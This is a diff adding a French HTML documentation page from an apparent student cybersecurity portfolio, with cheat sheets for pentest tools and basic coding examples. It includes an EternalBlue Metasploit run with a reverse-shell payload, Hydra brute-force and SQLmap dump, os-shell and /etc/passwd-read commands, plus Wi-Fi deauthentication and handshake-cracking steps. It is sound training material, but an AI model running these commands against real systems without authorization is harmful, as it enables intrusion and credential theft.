@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documentation - Portfolio Draco</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/documentation.css">
+</head>
+<body>
+    <header>
+        <div class="logo">Portfolio</div>
+        <nav>
+            <ul>
+                <li><a href="index.html">Accueil</a></li>
+                <li><a href="parcours.html">Parcours</a></li>
+                <li><a href="competences.html">Compétences</a></li>
+                <li><a href="projets.html">Projets</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section class="documentation">
+            <div class="doc-header">
+                <form class="doc-search" autocomplete="off" onsubmit="return false;">
+                    <input type="search" id="doc-search-input" placeholder="🔍 Rechercher..." name="search" aria-label="Recherche documentation" />
+                </form>
+                <h1>Documentation</h1>
+            </div>
+
+            <div class="doc-categories">
+                <button class="doc-cat-btn active" data-category="pentest">Pentest</button>
+                <button class="doc-cat-btn" data-category="code">Code</button>
+                <button class="doc-cat-btn" data-category="services">Services</button>
+                <button class="doc-cat-btn" data-category="reseau">Réseau & Cyber</button>
+            </div>
+            <div class="doc-subcategories" id="doc-subcategories" style="display:none;"></div>
+            <div class="doc-list" id="doc-list"></div>
+            <div class="doc-detail" id="doc-detail" style="display:none;">
+                <button class="back-btn" onclick="hideDetail()">← Retour</button>
+                <div id="doc-detail-content"></div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p class="copyright">© Tous droits réservés</p>
+    </footer>
+
+    <script>
+    const docData = {
+        pentest: [
+            {
+                title: "Nmap - Scanner réseau",
+                detail: `
+                    <p>
+                        <b>À quoi sert Nmap ?</b><br>
+                        Nmap ("Network Mapper") est l’outil de référence pour découvrir des hôtes et services sur un réseau, détecter les ports ouverts et identifier les systèmes d’exploitation.
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour cartographier un réseau cible<br>
+                        - Pour rechercher des services vulnérables<br>
+                        - En phase de reconnaissance d’un pentest
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>nmap 192.168.1.1</code> — Scan simple d’une IP</li>
+                        <li><code>nmap 192.168.1.0/24</code> — Scan d’un réseau entier</li>
+                        <li><code>nmap -sS cible</code> — Scan SYN (furtif)</li>
+                        <li><code>nmap -sV cible</code> — Détection de version des services</li>
+                        <li><code>nmap -O cible</code> — Détection du système d’exploitation</li>
+                        <li><code>nmap -A cible</code> — Scan avancé (OS, version, script, traceroute)</li>
+                        <li><code>nmap -p 22,80,443 cible</code> — Scanner des ports spécifiques</li>
+                        <li><code>nmap -p- cible</code> — Scanner tous les 65535 ports</li>
+                        <li><code>nmap --script vuln cible</code> — Lancer les scripts de détection de vulnérabilités</li>
+                        <li><code>nmap -T4 cible</code> — Accélérer le scan</li>
+                    </ul>
+                    <h3>Options utiles</h3>
+                    <ul>
+                        <li><b>-sU</b> : Scan UDP</li>
+                        <li><b>-Pn</b> : Ne pas faire de ping (utile si le firewall bloque l’ICMP)</li>
+                        <li><b>-oN fichier.txt</b> : Sauvegarder le résultat du scan</li>
+                        <li><b>-iL liste.txt</b> : Scanner toutes les IP d’un fichier</li>
+                        <li><b>-v</b> : Mode verbeux (plus d’infos)</li>
+                    </ul>
+                    <h3>Exemple complet</h3>
+                    <pre><code>nmap -sS -sV -O -p- -T4 -oN resultat.txt 192.168.1.1</code></pre>
+                    <p>
+                        <b>Documentation officielle :</b> <a href="https://nmap.org/book/man.html" target="_blank">https://nmap.org/book/man.html</a>
+                    </p>
+                `
+            },
+            {
+                title: "Metasploit - Framework d'exploitation",
+                detail: `
+                    <p>
+                        <b>À quoi sert Metasploit ?</b><br>
+                        Metasploit est le framework de référence pour l’exploitation de failles de sécurité et le développement d’exploits. Il permet de rechercher, tester et exploiter des vulnérabilités sur des systèmes cibles, d’automatiser les attaques, de générer des payloads et de piloter tout un test d’intrusion depuis une seule interface (<code>msfconsole</code>).
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la résistance d’un système à des attaques connues<br>
+                        - Pour automatiser l’exploitation de vulnérabilités<br>
+                        - Pour développer et tester ses propres exploits ou payloads<br>
+                        - Pour obtenir un accès distant (reverse shell, meterpreter, etc.)
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>msfconsole</code> — Lancer Metasploit en mode console</li>
+                        <li><code>search nom_vuln</code> — Rechercher un module (exploit, scanner...)</li>
+                        <li><code>use chemin/module</code> — Sélectionner un module</li>
+                        <li><code>info</code> — Infos détaillées sur le module sélectionné</li>
+                        <li><code>show options</code> — Voir les options à renseigner (RHOSTS, LHOST, etc.)</li>
+                        <li><code>set OPTION valeur</code> — Définir une option (ex : <code>set RHOSTS 192.168.1.10</code>)</li>
+                        <li><code>show payloads</code> — Voir les payloads compatibles</li>
+                        <li><code>set payload nom_payload</code> — Choisir un payload</li>
+                        <li><code>exploit</code> ou <code>run</code> — Lancer l’attaque</li>
+                        <li><code>back</code> — Revenir au menu principal</li>
+                        <li><code>exit</code> — Quitter Metasploit</li>
+                    </ul>
+                    <h3>Options principales d’un module</h3>
+                    <ul>
+                        <li><b>RHOSTS</b> : Adresse(s) IP cible(s)</li>
+                        <li><b>RPORT</b> : Port cible</li>
+                        <li><b>LHOST</b> : Adresse IP de l’attaquant (pour le reverse shell)</li>
+                        <li><b>LPORT</b> : Port d’écoute de l’attaquant</li>
+                        <li><b>PAYLOAD</b> : Type de charge utile (ex : <code>windows/x64/meterpreter/reverse_tcp</code>)</li>
+                        <li><b>SMBUser</b>, <b>SMBPass</b>, etc. : Options spécifiques selon le module</li>
+                    </ul>
+                    <h3>Exemple d’exploitation (EternalBlue)</h3>
+                    <pre><code>
+msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+                    </code></pre>
+                    <h3>Options avancées et astuces</h3>
+                    <ul>
+                        <li><code>show advanced</code> — Voir les options avancées (timeouts, scripts auto...)</li>
+                        <li><code>show missing</code> — Lister les options obligatoires non renseignées</li>
+                        <li><code>setg OPTION valeur</code> — Définir une option globale (pour tous les modules)</li>
+                        <li><code>sessions</code> — Lister les sessions ouvertes (post-exploitation)</li>
+                        <li><code>db_nmap</code> — Scanner avec Nmap et importer les résultats dans Metasploit</li>
+                    </ul>
+                    <h3>Ressources et documentation</h3>
+                    <ul>
+                        <li><a href="https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html" target="_blank">Documentation officielle Metasploit</a></li>
+                        <li><a href="https://www.offsec.com/metasploit-unleashed/" target="_blank">Metasploit Unleashed (OffSec)</a></li>
+                    </ul>
+                `
+            },
+            {
+                title: "Wireshark - Analyseur de paquets réseau",
+                detail: `
+                    <p>
+                        <b>À quoi sert Wireshark ?</b><br>
+                        Wireshark est le logiciel de référence pour capturer, visualiser et analyser le trafic réseau en temps réel ou à partir de fichiers de capture. Il permet de diagnostiquer des problèmes réseau, de détecter des attaques, ou d’étudier des protocoles en détail.
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour analyser le trafic réseau lors d’un pentest<br>
+                        - Pour détecter des failles, fuites de données, attaques<br>
+                        - Pour comprendre le fonctionnement de protocoles ou d’applications<br>
+                        - Pour faire du forensic réseau
+                    </p>
+                    <h3>Fonctionnalités principales</h3>
+                    <ul>
+                        <li>Capture de paquets en temps réel ou depuis un fichier (<code>.pcap</code>)</li>
+                        <li>Filtres puissants pour isoler des flux ou protocoles</li>
+                        <li>Décodage de centaines de protocoles (TCP, UDP, HTTP, DNS, SMB...)</li>
+                        <li>Reconstruction de sessions, extraction de fichiers</li>
+                        <li>Statistiques, graphiques, suivi de flux</li>
+                    </ul>
+                    <h3>Filtres d’affichage utiles</h3>
+                    <ul>
+                        <li><code>ip.addr == 192.168.1.10</code> — Tout le trafic impliquant cette IP</li>
+                        <li><code>tcp.port == 80</code> — Trafic HTTP</li>
+                        <li><code>http</code> — Tous les paquets HTTP</li>
+                        <li><code>dns</code> — Tous les paquets DNS</li>
+                        <li><code>tcp contains "mot"</code> — Paquets contenant une chaîne</li>
+                        <li><code>frame contains "password"</code> — Recherche de mots de passe en clair</li>
+                    </ul>
+                    <h3>Exemples d’utilisation</h3>
+                    <ul>
+                        <li>Lancer la capture : choisir l’interface, cliquer sur le bouton “Démarrer”</li>
+                        <li>Appliquer un filtre dans la barre de filtre</li>
+                        <li>Suivre un flux TCP : clic droit sur un paquet &gt; “Suivre” &gt; “Flux TCP”</li>
+                        <li>Enregistrer une capture : Fichier &gt; Enregistrer sous (<code>.pcapng</code>)</li>
+                        <li>Analyser un fichier : Fichier &gt; Ouvrir</li>
+                    </ul>
+                    <h3>Documentation</h3>
+                    <ul>
+                        <li><a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank">Guide utilisateur Wireshark</a></li>
+                        <li><a href="https://wiki.wireshark.org/CaptureFilters" target="_blank">Filtres Wireshark</a></li>
+                    </ul>
+                `
+            },
+            {
+                title: "Hydra - Brute force de services",
+                detail: `
+                    <p>
+                        <b>À quoi sert Hydra ?</b><br>
+                        Hydra est un outil de brute force très puissant pour tester des identifiants sur de nombreux protocoles (SSH, FTP, HTTP, SMB, RDP, etc.).
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la robustesse des mots de passe d’un service<br>
+                        - Pour auditer la sécurité d’un accès distant (SSH, FTP, etc.)<br>
+                        - Pour vérifier la présence de comptes faibles ou par défaut
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>hydra -l admin -P wordlist.txt ssh://192.168.1.10</code> — Brute force SSH avec login “admin”</li>
+                        <li><code>hydra -L users.txt -P pass.txt ftp://192.168.1.20</code> — Brute force FTP avec plusieurs logins et mots de passe</li>
+                        <li><code>hydra -V -l admin -P pass.txt rdp://192.168.1.30</code> — Mode verbeux sur RDP</li>
+                        <li><code>hydra -f -l admin -P pass.txt http-post-form "site.com/login.php:user=^USER^&pass=^PASS^:F=Identifiant incorrect"</code> — Brute force HTTP POST</li>
+                    </ul>
+                    <h3>Options utiles</h3>
+                    <ul>
+                        <li><b>-l</b> : Login unique</li>
+                        <li><b>-L</b> : Fichier de logins</li>
+                        <li><b>-p</b> : Mot de passe unique</li>
+                        <li><b>-P</b> : Fichier de mots de passe</li>
+                        <li><b>-t</b> : Nombre de threads (par défaut 16)</li>
+                        <li><b>-f</b> : Arrêter au premier succès</li>
+                        <li><b>-V</b> : Mode verbeux (affiche chaque tentative)</li>
+                    </ul>
+                    <h3>Documentation</h3>
+                    <ul>
+                        <li><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">Hydra sur GitHub</a></li>
+                        <li><a href="https://tools.kali.org/password-attacks/hydra" target="_blank">Hydra sur Kali</a></li>
+                    </ul>
+                `
+            },
+            {
+                title: "JohnTheRipper - Cracker de mots de passe",
+                detail: `
+                    <p>
+                        <b>À quoi sert JohnTheRipper ?</b><br>
+                        JohnTheRipper est un outil de craquage de mots de passe, capable de tester des milliers de mots de passe par seconde sur des hashs.
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la robustesse des mots de passe<br>
+                        - Après avoir récupéré un hash (ex : dump d’une base de données)
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>john hash.txt</code> — Craquer les hashs d’un fichier</li>
+                        <li><code>john --wordlist=rockyou.txt hash.txt</code> — Utiliser un dictionnaire spécifique</li>
+                        <li><code>john --show hash.txt</code> — Afficher les mots de passe trouvés</li>
+                    </ul>
+                    <h3>Formats supportés</h3>
+                    <ul>
+                        <li>MD5, SHA1, NTLM, bcrypt, etc.</li>
+                    </ul>
+                    <p>
+                        <b>Documentation :</b> <a href="https://www.openwall.com/john/doc/" target="_blank">https://www.openwall.com/john/doc/</a>
+                    </p>
+                `
+            },
+            {
+                title: "SQLmap - Injection SQL automatisée",
+                detail: `
+                    <p>
+                        <b>À quoi sert SQLmap ?</b><br>
+                        SQLmap automatise la détection et l’exploitation des failles d’injection SQL.
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la sécurité d’un site web utilisant une base de données SQL<br>
+                        - Pour extraire des données, lire des fichiers, obtenir un shell sur la base
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>sqlmap -u "http://site.com/page.php?id=1"</code> — Test d’injection sur une URL</li>
+                        <li><code>sqlmap -u "..." --dbs</code> — Lister les bases de données</li>
+                        <li><code>sqlmap -u "..." -D base --tables</code> — Lister les tables d’une base</li>
+                        <li><code>sqlmap -u "..." -D base -T table --columns</code> — Lister les colonnes d’une table</li>
+                        <li><code>sqlmap -u "..." -D base -T table -C col --dump</code> — Extraire les données</li>
+                    </ul>
+                    <h3>Options utiles</h3>
+                    <ul>
+                        <li><b>--risk=3 --level=5</b> : Scan plus agressif</li>
+                        <li><b>--os-shell</b> : Obtenir un shell système (si possible)</li>
+                        <li><b>--file-read=/etc/passwd</b> : Lire un fichier sur le serveur</li>
+                    </ul>
+                    <p>
+                        <b>Documentation :</b> <a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
+                    </p>
+                `
+            },
+            {
+                title: "Aircrack-ng - Audit Wi-Fi",
+                detail: `
+                    <p>
+                        <b>À quoi sert Aircrack-ng ?</b><br>
+                        Suite d’outils pour auditer la sécurité des réseaux Wi-Fi (WEP, WPA, WPA2).
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la robustesse d’un réseau Wi-Fi<br>
+                        - Pour capturer des handshakes et tenter de les cracker
+                    </p>
+                    <h3>Principaux outils</h3>
+                    <ul>
+                        <li><b>airodump-ng</b> : Capture de paquets</li>
+                        <li><b>aireplay-ng</b> : Injection de paquets/déauthentification</li>
+                        <li><b>aircrack-ng</b> : Craquage du handshake</li>
+                    </ul>
+                    <h3>Exemple d’attaque WPA2</h3>
+                    <ol>
+                        <li><code>airodump-ng wlan0</code> — Lister les réseaux</li>
+                        <li><code>airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0</code> — Capturer le handshake</li>
+                        <li><code>aireplay-ng -0 10 -a [BSSID] wlan0</code> — Déconnecter un client pour capturer le handshake</li>
+                        <li><code>aircrack-ng -w wordlist.txt -b [BSSID] capture.cap</code> — Craquer le handshake</li>
+                    </ol>
+                    <p>
+                        <b>Documentation :</b> <a href="https://www.aircrack-ng.org/doku.php?id=documentation" target="_blank">https://www.aircrack-ng.org/doku.php?id=documentation</a>
+                    </p>
+                `
+            },
+            {
+                title: "Burp Suite - Proxy d’analyse web",
+                detail: `
+                    <p>
+                        <b>À quoi sert Burp Suite ?</b><br>
+                        Burp Suite est un proxy web interactif pour l’analyse de la sécurité des applications web.
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour intercepter et modifier les requêtes HTTP/HTTPS<br>
+                        - Pour automatiser des scans de vulnérabilités web<br>
+                        - Pour manipuler les cookies, tokens, etc.
+                    </p>
+                    <h3>Fonctionnalités principales</h3>
+                    <ul>
+                        <li><b>Proxy</b> : Interception et modification du trafic</li>
+                        <li><b>Repeater</b> : Rejouer des requêtes</li>
+                        <li><b>Intruder</b> : Automatiser des attaques (bruteforce, fuzzing…)</li>
+                        <li><b>Scanner</b> : Scan automatique (version Pro)</li>
+                    </ul>
+                    <h3>Comment utiliser ?</h3>
+                    <ol>
+                        <li>Lance Burp Suite</li>
+                        <li>Configure ton navigateur pour utiliser le proxy (127.0.0.1:8080)</li>
+                        <li>Active le proxy dans Burp, navigue sur le site cible</li>
+                        <li>Utilise les autres modules pour tester les failles</li>
+                    </ol>
+                    <p>
+                        <b>Documentation :</b> <a href="https://portswigger.net/burp/documentation" target="_blank">https://portswigger.net/burp/documentation</a>
+                    </p>
+                `
+            },
+            {
+                title: "Hashcat - Cracker de hashs GPU",
+                detail: `
+                    <p>
+                        <b>À quoi sert Hashcat ?</b><br>
+                        Hashcat est le plus puissant outil de craquage de hashs par GPU, supportant de nombreux algorithmes (MD5, SHA1, NTLM, bcrypt…).
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la robustesse des mots de passe hashs<br>
+                        - Pour attaquer des dumps de hashs volumineux
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>hashcat -m 0 -a 0 hash.txt wordlist.txt</code> — Crack MD5 avec wordlist</li>
+                        <li><code>hashcat -m 1000 -a 0 hash.txt wordlist.txt</code> — Crack NTLM</li>
+                        <li><code>hashcat -m 0 -a 3 hash.txt ?a?a?a?a</code> — Bruteforce 4 caractères</li>
+                        <li><code>hashcat -m 0 -a 0 --show hash.txt wordlist.txt</code> — Afficher les résultats</li>
+                    </ul>
+                    <h3>Options utiles</h3>
+                    <ul>
+                        <li><b>-m</b> : Type de hash (voir <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">liste complète</a>)</li>
+                        <li><b>-a</b> : Mode d’attaque (0: wordlist, 3: bruteforce, etc.)</li>
+                        <li><b>--force</b> : Forcer l’exécution (si avertissement GPU)</li>
+                    </ul>
+                    <p>
+                        <b>Documentation :</b> <a href="https://hashcat.net/wiki/" target="_blank">https://hashcat.net/wiki/</a>
+                    </p>
+                `
+            }
+        ],
+        code: {
+            devweb: [
+                {
+                    title: "HTML - Structure de page web",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que HTML ?</b><br>
+                            HTML (HyperText Markup Language) est le langage de balisage qui structure le contenu d'une page web (titres, paragraphes, images, liens...).
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser ?</b><br>
+                            - Pour créer la structure d'un site web<br>
+                            - Indispensable pour tout développement web<br>
+                            - Utile en cyber pour comprendre l’architecture des sites à auditer
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Titre&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Titre principal&lt;/h1&gt;
+    &lt;p&gt;Ceci est un paragraphe.&lt;/p&gt;
+    &lt;a href="https://exemple.com"&gt;Un lien&lt;/a&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+                        <h3>Balises utiles</h3>
+                        <ul>
+                            <li><code>&lt;h1&gt; à &lt;h6&gt;</code> : Titres</li>
+                            <li><code>&lt;p&gt;</code> : Paragraphe</li>
+                            <li><code>&lt;a href=""&gt;</code> : Lien</li>
+                            <li><code>&lt;img src=""&gt;</code> : Image</li>
+                            <li><code>&lt;ul&gt;, &lt;ol&gt;, &lt;li&gt;</code> : Listes</li>
+                            <li><code>&lt;form&gt;, &lt;input&gt;, &lt;button&gt;</code> : Formulaires</li>
+                        </ul>
+                        <p>
+                            <b>Plus d'infos :</b> <a href="https://developer.mozilla.org/fr/docs/Web/HTML" target="_blank">MDN HTML</a>
+                        </p>
+                    `
+                },
+                {
+                    title: "CSS - Mise en forme",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que CSS ?</b><br>
+                            CSS (Cascading Style Sheets) est le langage de style qui permet de mettre en forme le HTML (couleurs, tailles, disposition...).
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser ?</b><br>
+                            - Pour personnaliser l'apparence d'un site<br>
+                            - Pour rendre un site responsive<br>
+                            - En cyber, pour comprendre ou modifier le rendu d’un site lors d’un pentest web
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>h1 {
+  color: #8d2cf7;
+  font-size: 2rem;
+}
+p {
+  margin-bottom: 1em;
+}
+a {
+  color: #23243a;
+  text-decoration: underline;
+}
+</code></pre>
+                        <h3>Sélecteurs courants</h3>
+                        <ul>
+                            <li><code>p</code> : Tous les paragraphes</li>
+                            <li><code>.maClasse</code> : Tous les éléments avec la classe "maClasse"</li>
+                            <li><code>#monId</code> : L’élément avec l’id "monId"</li>
+                            <li><code>div > p</code> : Les <code>&lt;p&gt;</code> enfants directs de <code>&lt;div&gt;</code></li>
+                        </ul>
+                        <p>
+                            <b>Plus d'infos :</b> <a href="https://developer.mozilla.org/fr/docs/Web/CSS" target="_blank">MDN CSS</a>
+                        </p>
+                    `
+                },
+                {
+                    title: "JavaScript - Dynamiser le web",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que JavaScript ?</b><br>
+                            JavaScript est le langage de programmation qui permet de rendre les pages web interactives (animations, formulaires dynamiques, requêtes AJAX...).
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser ?</b><br>
+                            - Pour ajouter de l’interactivité à un site<br>
+                            - Pour manipuler le DOM à la volée<br>
+                            - En cyber, pour comprendre/exploiter des failles XSS, CSRF, etc.
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>// Afficher une alerte
+alert("Hello, world!");
+
+// Modifier le texte d'un élément
+document.getElementById("demo").innerText = "Nouveau texte";
+
+// Boucle for
+for(let i=0; i&lt;5; i++) {
+  console.log(i);
+}
+</code></pre>
+                        <h3>Possibilités courantes</h3>
+                        <ul>
+                            <li>Manipulation du DOM</li>
+                            <li>Gestion des événements (clics, touches...)</li>
+                            <li>Requêtes AJAX/fetch</li>
+                            <li>Exploitation de failles XSS (en cyber)</li>
+                        </ul>
+                        <p>
+                            <b>Plus d'infos :</b> <a href="https://developer.mozilla.org/fr/docs/Web/JavaScript" target="_blank">MDN JS</a>
+                        </p>
+                    `
+                },
+                {
+                    title: "PHP - Dynamique côté serveur",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que PHP ?</b><br>
+                            PHP est un langage de script côté serveur, très utilisé pour générer des pages web dynamiques et interagir avec des bases de données.
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser ?</b><br>
+                            - Pour créer des sites dynamiques (WordPress, forums, etc.)<br>
+                            - Pour traiter des formulaires, gérer des sessions, accéder à une base de données<br>
+                            - En cyber, pour comprendre/exploiter des failles RCE, LFI, SQLi, etc.
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>&lt;?php
+echo "Hello, world!";
+$nom = "Dracoo";
+echo "&lt;p&gt;Bonjour $nom&lt;/p&gt;";
+?&gt;
+</code></pre>
+                        <h3>Fonctionnalités courantes</h3>
+                        <ul>
+                            <li>Connexion à une base MySQL (<code>mysqli_connect</code>, <code>PDO</code>)</li>
+                            <li>Gestion des sessions (<code>session_start()</code>)</li>
+                            <li>Upload de fichiers</li>
+                            <li>En cyber, analyse de code pour trouver des failles</li>
+                        </ul>
+                        <p>
+                            <b>Plus d'infos :</b> <a href="https://www.php.net/manual/fr/" target="_blank">PHP.net</a>
+                        </p>
+                    `
+                }
+            ],
+            code: [
+                {
+                    title: "C - Le langage système",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que C ?</b><br>
+                            C est un langage de programmation bas niveau, rapide et puissant, utilisé pour écrire des systèmes d’exploitation, drivers, outils systèmes.
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser en cyber ?</b><br>
+                            - Pour écrire des exploits, des scanners réseaux<br>
+                            - Pour analyser ou modifier des binaires<br>
+                            - Pour comprendre les failles mémoire (buffer overflow, format string, etc.)
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>#include &lt;stdio.h&gt;
+
+int main() {
+    printf("Hello, world!\\n");
+    return 0;
+}
+</code></pre>
+                        <h3>Manipulation mémoire (buffer overflow)</h3>
+                        <pre><code>char buf[8];
+gets(buf); // Vulnérable !
+</code></pre>
+                        <h3>Réseau (socket)</h3>
+                        <pre><code>#include &lt;sys/socket.h&gt; ...</code></pre>
+                        <p>
+                            <b>Plus d'infos :</b> <a href="https://en.wikibooks.org/wiki/C_Programming" target="_blank">Cours C</a>
+                        </p>
+                    `
+                },
+                {
+                    title: "C++ - POO et performance",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que C++ ?</b><br>
+                            C++ est une extension de C qui ajoute la programmation orientée objet et de nombreuses fonctionnalités modernes.
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser en cyber ?</b><br>
+                            - Pour écrire des outils performants<br>
+                            - Pour la rétro-ingénierie (beaucoup de malwares sont en C++)<br>
+                            - Pour manipuler des structures complexes en mémoire
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>#include &lt;iostream&gt;
+using namespace std;
+
+int main() {
+    cout &lt;&lt; "Hello, C++!" &lt;&lt; endl;
+    return 0;
+}
+</code></pre>
+                        <h3>Classe simple</h3>
+                        <pre><code>class User {
+public:
+    string name;
+    User(string n) : name(n) {}
+};
+</code></pre>
+                        <h3>Pointeurs, références, STL...</h3>
+                        <pre><code>#include &lt;vector&gt;
+vector&lt;int&gt; v = {1,2,3};</code></pre>
+                        <p>
+                            <b>Plus d'infos ;</b> <a href="https://en.cppreference.com/w/" target="_blank">cppreference</a>
+                        </p>
+                    `
+                },
+                {
+                    title: "Python - Polyvalence et scripting",
+                    detail: `
+                        <p>
+                            <b>Qu'est-ce que Python ?</b><br>
+                            Python est un langage de programmation haut niveau, simple à apprendre, très utilisé en cybersécurité pour l’automatisation, le scripting, l’analyse de données, etc.
+                        </p>
+                        <p>
+                            <b>Pourquoi l'utiliser en cyber ?</b><br>
+                            - Pour écrire des scripts d’automatisation (scan, brute force, parsing de logs)<br>
+                            - Pour développer des outils personnalisés<br>
+                            - Pour l’analyse de fichiers, de réseaux, de malwares
+                        </p>
+                        <h3>Exemples de base</h3>
+                        <pre><code>print("Hello, world!")
+for i in range(5):
+    print(i)
+</code></pre>
+                        <h3>Lire un fichier</h3>
+                        <pre><code>with open("fichier.txt") as f:
+    contenu = f.read()
+</code></pre>
+                        <h3>Socket (client TCP simple)</h3>
+                        <pre><code>import socket
+s = socket.socket()
+s.connect(("localhost", 80))
+s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
+print(s.recv(1024))
+</code></pre>
+                        <h3>Brute force SSH avec paramiko (lib externe)</h3>
+                        <pre><code>import paramiko
+# ... voir la doc paramiko ...
+</code></pre>
+                        <h3>Parsing de logs</h3>
+                        <pre><code>with open("auth.log") as f:
+    for line in f:
+        if "Failed password" in line:
+            print(line)
+</code></pre>
+                        <p>
+                            <b>Plus d'infos :</b> <a href="https://docs.python.org/fr/3/" target="_blank">docs.python.org</a>
+                        </p>
+                    `
+                }
+            ]
+        },
+        services: [
+            {
+                title: "Installer un serveur FOG",
+                detail: "<p>Guide pas à pas pour installer FOG sur Debian/Ubuntu.<br><a href='#'>Voir le guide complet</a></p>"
+            },
+            {
+                title: "Déployer GLPI",
+                detail: "<p>Étapes pour installer et configurer GLPI.<br><a href='#'>Voir le tuto</a></p>"
+            }
+        ],
+        reseau: [
+            {
+                title: "Configurer une interface réseau Linux",
+                detail: "<p><code>ip addr add 192.168.1.10/24 dev eth0</code></p>"
+            },
+            {
+                title: "Configurer un firewall UFW",
+                detail: "<p><code>ufw allow 22/tcp</code></p>"
+            }
+        ]
+    };
+
+    const codeSubcats = [
+        { key: "devweb", label: "🌐 Dev Web" },
+        { key: "code", label: "💻 Code" }
+    ];
+
+    let currentMainCat = "pentest";
+    let currentSubCat = null;
+
+    function showDocList(category, subcat=null) {
+        currentMainCat = category;
+        currentSubCat = subcat;
+        const listDiv = document.getElementById('doc-list');
+        const detailDiv = document.getElementById('doc-detail');
+        const subcatDiv = document.getElementById('doc-subcategories');
+        detailDiv.style.display = 'none';
+        listDiv.innerHTML = '';
+        if(category === "code") {
+            subcatDiv.innerHTML = "";
+            subcatDiv.style.display = "flex";
+            codeSubcats.forEach(s => {
+                const btn = document.createElement('button');
+                btn.className = "doc-subcat-btn" + (subcat===s.key ? " active" : "");
+                btn.innerHTML = s.label;
+                btn.onclick = () => showDocList("code", s.key);
+                subcatDiv.appendChild(btn);
+            });
+            if(!subcat) return;
+            docData.code[subcat].forEach((item, idx) => {
+                const btn = document.createElement('button');
+                btn.className = "doc-list-btn";
+                btn.innerText = item.title;
+                btn.onclick = () => showDetail("code", idx, subcat);
+                listDiv.appendChild(btn);
+            });
+        } else {
+            subcatDiv.style.display = "none";
+            docData[category].forEach((item, idx) => {
+                const btn = document.createElement('button');
+                btn.className = "doc-list-btn";
+                btn.innerText = item.title;
+                btn.onclick = () => showDetail(category, idx);
+                listDiv.appendChild(btn);
+            });
+        }
+        listDiv.style.display = 'flex';
+    }
+
+    function showDetail(category, idx, subcat=null) {
+        const detailDiv = document.getElementById('doc-detail');
+        const detailContent = document.getElementById('doc-detail-content');
+        let item;
+        if(category === "code" && subcat) {
+            item = docData.code[subcat][idx];
+        } else {
+            item = docData[category][idx];
+        }
+        detailContent.innerHTML = `<h2>${item.title}</h2>${item.detail}`;
+        detailDiv.style.display = 'block';
+        document.getElementById('doc-list').style.display = 'none';
+    }
+
+    function hideDetail() {
+        document.getElementById('doc-detail').style.display = 'none';
+        document.getElementById('doc-list').style.display = 'flex';
+    }
+
+    document.querySelectorAll('.doc-cat-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.doc-cat-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            if(btn.getAttribute('data-category') === "code") {
+                showDocList("code");
+            } else {
+                showDocList(btn.getAttribute('data-category'));
+            }
+        });
+    });
+
+    showDocList('pentest');
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
